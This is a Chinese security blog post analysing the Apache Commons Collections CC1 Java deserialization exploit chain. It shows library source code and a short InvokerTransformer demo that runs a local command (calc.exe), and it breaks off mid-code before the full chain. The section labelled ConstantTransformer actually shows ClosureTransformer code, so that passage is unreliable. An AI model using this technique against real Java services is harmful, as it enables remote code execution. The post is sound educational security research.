<!DOCTYPE html>
<html lang='en' ><meta charset="utf-8">
<meta name="viewport" content="width=device-width">


<title>CC1利用链分析 | Oulaa</title>

<meta name="generator" content="Hugo Eureka 0.8.3" />
<link rel="stylesheet" href="/css/eureka.min.css">
<script defer src="/js/eureka.min.js"></script>

<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="preload"
  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap"
  as="style" onload="this.onload=null;this.rel='stylesheet'">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/solarized-light.min.css"
   media="print"
  onload="this.media='all';this.onload=null" crossorigin>
<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/highlight.min.js"
   crossorigin></script>

<script defer src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/js/all.min.js"
   integrity="sha256-uNYoXefWRqv&#43;PsIF/OflNmwtKM4lStn9yrz2gVl6ymo="  crossorigin></script>




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
   integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3&#43;Aro6EYUG4&#43;cU&#43;KJWu/X"  media="print"
  onload="this.media='all';this.onload=null" crossorigin>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" 
  integrity="sha384-g7c&#43;Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI&#43;sEnkvrMWph2EDg4"  crossorigin></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
   integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC&#43;Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa"  crossorigin></script>
<script>
  document.addEventListener("DOMContentLoaded", function () {
    renderMathInElement(document.body, {
      delimiters: [
        { left: "$$", right: "$$", display: true },
        { left: "$", right: "$", display: false },
        { left: "\\(", right: "\\)", display: false },
        { left: "\\[", right: "\\]", display: true }
      ],
    });
  });
</script>


<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.9.2/dist/mermaid.min.js" 
  integrity="sha256-Zmpaaj&#43;GXFsPF5WdPArSrnW3b30dovldeKsW00xBVwE="  crossorigin></script>


<link rel="icon" type="image/png" sizes="32x32" href="/images/icon_hu64421c6c7700f606f0ad45d807017b09_5843_32x32_fill_box_center_3.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/icon_hu64421c6c7700f606f0ad45d807017b09_5843_180x180_fill_box_center_3.png">

<meta name="description"
  content="TransformedMap利用链是最早的Java反序列化利用链">
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
      "@type": "ListItem",
      "position": 1 ,
      "name":"Posts",
      "item":"/posts/"},{
      "@type": "ListItem",
      "position": 2 ,
      "name":"CC1利用链分析",
      "item":"/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"}]
}
</script>



<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"
    },
    "headline": "CC1利用链分析 | Oulaa","datePublished": "2021-10-16T00:00:00+00:00",
    "dateModified": "2021-10-16T00:00:00+00:00",
    "wordCount":  1656 ,
    "author": {
        "@type": "Person",
        "name": ["Oulaa"]
    },
    "publisher": {
        "@type": "Person",
        "name": "C. Wang",
        "logo": {
            "@type": "ImageObject",
            "url": "/images/icon.png"
        }
        },
    "description": "TransformedMap利用链是最早的Java反序列化利用链"
}
</script><meta property="og:title" content="CC1利用链分析 | Oulaa" />
<meta property="og:type" content="article" />


<meta property="og:image" content="/images/icon.png">


<meta property="og:url" content="/posts/transformedmap%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" />



<meta property="og:description" content="TransformedMap利用链是最早的Java反序列化利用链" />



<meta property="og:locale" content="en" />




<meta property="og:site_name" content="Oulaa" />






<meta property="article:published_time" content="2021-10-16T00:00:00&#43;00:00" />


<meta property="article:modified_time" content="2021-10-16T00:00:00&#43;00:00" />



<meta property="article:section" content="posts" />


<meta property="article:tag" content="Java安全" />

<meta property="article:tag" content="web" />





<meta property="og:see_also" content="/posts/j1/" />



<body class="flex flex-col min-h-screen">
  <header class="fixed flex items-center w-full min-h-16 pl-scrollbar z-50 bg-secondary-bg shadow-sm">
    <div class="w-full max-w-screen-xl mx-auto"><script>
    let storageColorScheme = localStorage.getItem("lightDarkMode")
    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
        document.getElementsByTagName('html')[0].classList.add('dark')
    }
</script>
<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
    <a href="/" class="mr-6 text-primary-text text-xl font-bold">Oulaa</a>
    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
        <i class="fas fa-bars"></i>
    </button>

    <div id="target"
        class="hidden block md:flex md:flex-grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
        <div class="md:flex md:h-16 text-sm md:flex-grow pb-4 md:pb-0 border-b md:border-b-0">
            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  mr-4">关于我</a>
            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  mr-4">文章</a>
            <a href="/docs/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  mr-4">文档</a>
        </div>

        <div class="flex">
            <div class="relative pt-4 md:pt-0">
                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
                    <i class="fas fa-adjust"></i>
                </div>
                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
                </div>
                <div class="absolute flex flex-col left-0 md:left-auto right-auto md:right-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
                    id='lightDarkOptions'>
                    <span class="px-4 py-1 hover:text-eureka" name="Light">Light</span>
                    <span class="px-4 py-1 hover:text-eureka" name="Dark">Dark</span>
                    <span class="px-4 py-1 hover:text-eureka" name="Auto">Auto</span>
                </div>
            </div>
        </div>
    </div>

    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
    </div>

</nav>
<script>
    
    let element = document.getElementById('lightDarkMode')
    if (storageColorScheme == null || storageColorScheme == 'Auto') {
        document.addEventListener('DOMContentLoaded', () => {
            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
        })
    } else if (storageColorScheme == "Light") {
        element.firstElementChild.classList.remove('fa-adjust')
        element.firstElementChild.setAttribute("data-icon", 'sun')
        element.firstElementChild.classList.add('fa-sun')
    } else if (storageColorScheme == "Dark") {
        element.firstElementChild.classList.remove('fa-adjust')
        element.firstElementChild.setAttribute("data-icon", 'moon')
        element.firstElementChild.classList.add('fa-moon')
    }

    document.addEventListener('DOMContentLoaded', () => {
        getcolorscheme();
        switchBurger();
    });
</script>
</div>
  </header>
  <main class="flex-grow pt-16">
    <div class="pl-scrollbar">
      <div class="w-full max-w-screen-xl lg:px-4 xl:px-8 mx-auto">


<div class="grid grid-cols-2 lg:grid-cols-8 gap-4 lg:pt-12">
    <div
        class="col-span-2  lg:col-span-6 bg-secondary-bg rounded px-6 py-8">
        <h1 class="font-bold text-3xl text-primary-text">CC1利用链分析</h1>
        <div class="flex flex-wrap flex-row items-center mt-2 text-tertiary-text">
    <div class="mr-6 my-2">
        <i class="fas fa-calendar mr-1"></i>
        <span>2021-10-16</span>
    </div>
    <div class="mr-6 my-2">
        <i class="fas fa-clock mr-1"></i>
        <span>8 min read</span>
    </div>
    
    
    <div class="mr-6 my-2">
        <i class="fas fa-folder mr-1"></i>
        
        <a href="/categories/web/" class="hover:text-eureka">web</a>
        
    </div>
    

    
</div>
        
        
        

        <div class="content">
            <p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection(集合)</code>相关类对象。</p>
<p>在该组件中有一个Transformer接口，实现了该接口的类有 ConstantTransformer、invokerTransformer、ChainedTransformer、TransformedMap等等</p>
<h2 id="一复现环境">一、复现环境</h2>
<p>环境：</p>
<p>maven依赖</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#666">&lt;!--</span> https<span style="color:#666">:</span><span style="color:#408080;font-style:italic">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;
</span><span style="color:#408080;font-style:italic"></span><span style="color:#666">&lt;</span>dependency<span style="color:#666">&gt;</span>
<span style="color:#666">&lt;</span>groupId<span style="color:#666">&gt;</span>commons<span style="color:#666">-</span>collections<span style="color:#666">&lt;/</span>groupId<span style="color:#666">&gt;</span>
<span style="color:#666">&lt;</span>artifactId<span style="color:#666">&gt;</span>commons<span style="color:#666">-</span>collections<span style="color:#666">&lt;/</span>artifactId<span style="color:#666">&gt;</span>
<span style="color:#666">&lt;</span>version<span style="color:#666">&gt;</span>3<span style="color:#666">.</span><span style="color:#7d9029">1</span><span style="color:#666">&lt;/</span>version<span style="color:#666">&gt;</span>
<span style="color:#666">&lt;/</span>dependency<span style="color:#666">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="二分析">二、分析</h2>
<h3 id="constanttransformer类">ConstantTransformer类</h3>
<p>该类是对Transformer类的实现。</p>
<p>可以看到该类重写了transform方法，并且调用了Closure.execute方法，并且返回一个对象。</p>
<p>简单来说，如果实例化ConstantTransformer对象的时候传入的是A类实例，那么我们调用该对象的transform对象的时候就会返回A类的实例。</p>
<p>也就是它的作用是对对象进行了输入输出的转化。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">class</span> <span style="color:#00f;font-weight:bold">ClosureTransformer</span> <span style="color:#008000;font-weight:bold">implements</span> Transformer<span style="color:#666">,</span> Serializable <span style="color:#666">{</span>
    <span style="color:#008000;font-weight:bold">private</span> <span style="color:#008000;font-weight:bold">static</span> <span style="color:#008000;font-weight:bold">final</span> <span style="color:#b00040">long</span> serialVersionUID <span style="color:#666">=</span> 478466901448617286L<span style="color:#666">;</span>
    <span style="color:#008000;font-weight:bold">private</span> <span style="color:#008000;font-weight:bold">final</span> Closure iClosure<span style="color:#666">;</span>

    <span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">static</span> Transformer <span style="color:#00f">getInstance</span><span style="color:#666">(</span>Closure closure<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>closure <span style="color:#666">==</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">throw</span> <span style="color:#008000;font-weight:bold">new</span> IllegalArgumentException<span style="color:#666">(</span><span style="color:#ba2121">&#34;Closure must not be null&#34;</span><span style="color:#666">);</span>
        <span style="color:#666">}</span> <span style="color:#008000;font-weight:bold">else</span> <span style="color:#666">{</span>
            <span style="color:#008000;font-weight:bold">return</span> <span style="color:#008000;font-weight:bold">new</span> ClosureTransformer<span style="color:#666">(</span>closure<span style="color:#666">);</span>
        <span style="color:#666">}</span>
    <span style="color:#666">}</span>

    <span style="color:#008000;font-weight:bold">public</span> <span style="color:#00f">ClosureTransformer</span><span style="color:#666">(</span>Closure closure<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">iClosure</span> <span style="color:#666">=</span> closure<span style="color:#666">;</span>
    <span style="color:#666">}</span>

    <span style="color:#008000;font-weight:bold">public</span> Object <span style="color:#00f">transform</span><span style="color:#666">(</span>Object input<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">iClosure</span><span style="color:#666">.</span><span style="color:#7d9029">execute</span><span style="color:#666">(</span>input<span style="color:#666">);</span>
        <span style="color:#008000;font-weight:bold">return</span> input<span style="color:#666">;</span>
    <span style="color:#666">}</span>

    <span style="color:#008000;font-weight:bold">public</span> Closure <span style="color:#00f">getClosure</span><span style="color:#666">()</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">return</span> <span style="color:#008000;font-weight:bold">this</span><span style="color:#666">.</span><span style="color:#7d9029">iClosure</span><span style="color:#666">;</span>
    <span style="color:#666">}</span>
<span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="invokertransformer">InvokerTransformer</h3>
<p>在<code>Collections</code>组件中提供了一个非常重要的类: <code>org.apache.commons.collections.functors.InvokerTransformer</code>，这个类实现了:<code>java.io.Serializable</code>接口。2015年有研究者发现利用<code>InvokerTransformer</code>类的<code>transform</code>方法可以实现Java反序列化<code>RCE</code>，并提供了利用方法:<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">CommonsCollections1.java</a>。</p>
<p><code>InvokerTransformer</code>类实现了<code>org.apache.commons.collections.Transformer</code>接口,<code>Transformer</code>提供了一个对象转换方法：<code>transform</code>，<strong>主要用于将输入对象转换为输出对象</strong>。<code>InvokerTransformer</code><strong>类的主要作用就是利用Java反射机制来创建类实例。</strong></p>
<p><strong><code>InvokerTransformer</code>类的<code>transform</code>方法：</strong></p>
<p>可以看到，该类主要作用是调用传入类的任意方法。并且它是通过反射去实现的。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
 <span style="color:#008000;font-weight:bold">public</span> <span style="color:#00f">InvokerTransformer</span><span style="color:#666">(</span>String methodName<span style="color:#666">,</span> Class<span style="color:#666">[]</span> paramTypes<span style="color:#666">,</span> Object<span style="color:#666">[]</span> args<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">super</span><span style="color:#666">();</span>
        iMethodName <span style="color:#666">=</span> methodName<span style="color:#666">;</span>
        iParamTypes <span style="color:#666">=</span> paramTypes<span style="color:#666">;</span>
        iArgs <span style="color:#666">=</span> args<span style="color:#666">;</span>
    <span style="color:#666">}</span>
<span style="color:#008000;font-weight:bold">public</span> Object <span style="color:#00f">transform</span><span style="color:#666">(</span>Object input<span style="color:#666">)</span> <span style="color:#666">{</span>
    <span style="color:#008000;font-weight:bold">if</span> <span style="color:#666">(</span>input <span style="color:#666">==</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#008000;font-weight:bold">return</span> <span style="color:#008000;font-weight:bold">null</span><span style="color:#666">;</span>
    <span style="color:#666">}</span>
    <span style="color:#008000;font-weight:bold">try</span> <span style="color:#666">{</span>
          <span style="color:#408080;font-style:italic">// 获取输入类的类对象
</span><span style="color:#408080;font-style:italic"></span>        Class cls <span style="color:#666">=</span> input<span style="color:#666">.</span><span style="color:#7d9029">getClass</span><span style="color:#666">();</span>

          <span style="color:#408080;font-style:italic">// 通过输入的方法名和方法参数，获取指定的反射方法对象
</span><span style="color:#408080;font-style:italic"></span>        Method method <span style="color:#666">=</span> cls<span style="color:#666">.</span><span style="color:#7d9029">getMethod</span><span style="color:#666">(</span>iMethodName<span style="color:#666">,</span> iParamTypes<span style="color:#666">);</span>

          <span style="color:#408080;font-style:italic">// 反射调用指定的方法并返回方法调用结果
</span><span style="color:#408080;font-style:italic"></span>        <span style="color:#008000;font-weight:bold">return</span> method<span style="color:#666">.</span><span style="color:#7d9029">invoke</span><span style="color:#666">(</span>input<span style="color:#666">,</span> iArgs<span style="color:#666">);</span>

    <span style="color:#666">}</span> <span style="color:#008000;font-weight:bold">catch</span> <span style="color:#666">(</span>Exception ex<span style="color:#666">)</span> <span style="color:#666">{</span>
        <span style="color:#408080;font-style:italic">// 省去异常处理部分代码
</span><span style="color:#408080;font-style:italic"></span>    <span style="color:#666">}</span>
<span style="color:#666">}</span>


</code></pre></td></tr></table>
</div>
</div><p>一般来说，想要RCE，需要使用到Runtime这个类，但是Runtime的构造函数是一个私有方法，所以不能够直接对其进行实例化。</p>
<p><strong>使用<code>InvokerTransformer</code>实现调用本地命令执行方法：</strong></p>
<p>这里直接传入了一个Runtime实例，并且调用了exec方法。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">static</span> <span style="color:#b00040">void</span> <span style="color:#00f">main</span><span style="color:#666">(</span>String<span style="color:#666">[]</span> args<span style="color:#666">)</span> <span style="color:#666">{</span>
      <span style="color:#408080;font-style:italic">// 定义需要执行的本地系统命令
</span><span style="color:#408080;font-style:italic"></span>        String cmd <span style="color:#666">=</span> <span style="color:#ba2121">&#34;calc.exe&#34;</span><span style="color:#666">;</span>

    <span style="color:#408080;font-style:italic">// 构建transformer对象
</span><span style="color:#408080;font-style:italic"></span>    InvokerTransformer transformer <span style="color:#666">=</span> <span style="color:#008000;font-weight:bold">new</span> InvokerTransformer<span style="color:#666">(</span>
          <span style="color:#ba2121">&#34;exec&#34;</span><span style="color:#666">,</span> <span style="color:#008000;font-weight:bold">new</span> Class<span style="color:#666">[]{</span>String<span style="color:#666">.</span><span style="color:#7d9029">class</span><span style="color:#666">},</span> <span style="color:#008000;font-weight:bold">new</span> Object<span style="color:#666">[]{</span>cmd<span style="color:#666">}</span>
    <span style="color:#666">);</span>

    <span style="color:#408080;font-style:italic">// 传入Runtime实例，执行对象转换操作
</span><span style="color:#408080;font-style:italic"></span>    transformer<span style="color:#666">.</span><span style="color:#7d9029">transform</span><span style="color:#666">(</span>Runtime<span style="color:#666">.</span><span style="color:#7d9029">getRuntime</span><span style="color:#666">());</span>
<span style="color:#666">}</span>
</code></pre></td></tr></table>
</div>
</div><p>以上写法直接实例化了一个Runtime对象，但是<strong>Runtime类并没有实现序列化接口</strong>（可以去看源码），也就是说，<strong>Runtime实例对象不能够被序列化</strong>，因此在构建Payload的时候，尽量在程序中不要出现Runtime实例化出来的对象，因此需要两个类:</p>
<p>上面说的ConstantTransformer类和ChainedTransformer类</p>
<h3 id="chainedtransformer">ChainedTransformer</h3>
<p>该类的主要作用是链式调用transform。</p>
<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#008000;font-weight:bold">public</span> <span style="color:#008000;font-weight:bold">class</span> <span style="color:#00f;font-weight:bold">ChainedTransformer</span> <span style="color:#008000;font-weight:bold">implements</span> Transformer<span style="color:#666">,</span> Serializable <span style="color:#666">{</span>

  <span style="color:#408080;font-style:italic">/** The transformers to call in turn */</span>
